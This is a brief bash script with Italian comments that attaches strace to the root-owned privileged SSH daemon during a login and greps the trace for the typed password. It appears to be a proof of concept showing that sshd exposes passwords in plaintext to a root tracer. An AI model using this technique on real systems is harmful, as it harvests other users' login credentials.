#!/bin/bash
# QUESTO SCRIPT DEVE ESSERE ESEGUITO QUANDO IL DEMONE SSH RICHIEDE LA PASSWORD

# TRACING DELLE CHIAMATE DEL DAEMON SSH
ssh_pid=$(ps -elf | grep "priv" | grep "root" | awk '{print $4}')
sudo strace -o ssh.log -p $ssh_pid

echo "Type ssh password to be traced:"
read -s psw

# stampa del risultato filtrato
cat ssh.log | grep $psw





